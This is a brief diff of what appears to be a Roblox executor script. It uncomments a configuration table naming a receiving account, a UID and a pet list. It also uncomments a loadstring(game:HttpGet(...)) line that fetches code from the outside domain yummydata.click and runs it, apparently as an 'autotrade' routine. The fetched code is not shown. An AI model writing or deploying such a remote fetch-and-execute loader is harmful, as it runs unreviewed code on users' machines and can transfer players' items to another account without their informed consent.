@@ -1,4 +1,4 @@
---getgenv().Data = {
+getgenv().Data = {
     ["Account Main"] = "congahpz002",
     ["UID"] = "chickenz",
     ["Pets"] = {
@@ -17,4 +17,4 @@
         "Luminosity"
     }
 }
---loadstring(game:HttpGet("https://yummydata.click/autotrade"))()
+loadstring(game:HttpGet("https://yummydata.click/autotrade"))()
